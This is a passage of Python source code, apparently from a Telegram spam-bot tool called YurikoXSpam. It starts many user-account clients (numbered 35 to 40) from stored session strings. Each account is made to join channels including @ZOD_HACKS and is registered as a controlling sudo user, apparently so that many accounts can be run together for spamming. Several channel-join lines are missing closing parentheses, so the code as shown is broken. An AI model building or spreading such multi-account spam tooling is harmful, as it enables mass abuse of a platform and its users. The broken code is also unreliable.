            await Yur35(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur35 = "STRING"
            print(e)
            pass
    else:
        print("Session 35 not Found")
        session_name = "yurikoxspam"
        Yur35 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur35.start()
        except Exception as e:
            pass


    if STRING36:
        session_name = str(STRING36)
        print("String 36 Found")
        Yur36 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 36")
            await Yur36.start()
            botme = await Yur36.get_me()
            await Yur36(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur36(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur36(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur36 = "STRING"
            print(e)
            pass
    else:
        print("Session 36 not Found")
        session_name = "yurikoxspam"
        Yur36 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur36.start()
        except Exception as e:
            pass
   
    if STRING37:
        session_name = str(STRING37)
        print("String 37 Found")
        Yur37 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 37")
            await Yur37.start()
            botme = await Yur37.get_me()
            await Yur37(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur37(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur37(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur37 = "STRING"
            print(e)
            pass
    else:
        print("Session 37 not Found")
        session_name = "yurikoxspam"
        Yur37 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur37.start()
        except Exception as e:
            pass
   
    if STRING38:
        session_name = str(STRING38)
        print("String 38 Found")
        Yur38 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 38")
            await Yur38.start()
            botme = await Yur38.get_me()
            await Yur38(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur38(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur38(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur38 = "STRING"
            print(e)
            pass
    else:
        print("Session 38 not Found")
        session_name = "yurikoxspam"
        Yur38 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur38.start()
        except Exception as e:
            pass
   
    if STRING39:
        session_name = str(STRING39)
        Yur39 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 39")
            await Yur39.start()
            botme = await Yur39.get_me()
            await Yur39(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur39(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur39(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur39 = "STRING"
            print(e)
            pass
    else:
        print("Session 39 not Found")
        session_name = "yurikoxspam"
        Yur39 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur39.start()
        except Exception as e:
            pass
   
    if STRING40:
        session_name = str(STRING40)
        print("String 40 Found")
        Yur40 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 40")
            await Yur40.start()
            botme = await Yur40.get_me()
            await Yur40(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur40(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur40(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur40 = "STRING"
            print(e)
            pass
    else:
        print("Session 40 not Found")
        session_name = "yurikoxspam"
        Yur40 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur40.start()
        except Exception as e:
            pass

loop = asyncio.get_event_loop()
loop.run_until_complete(YurikoX())
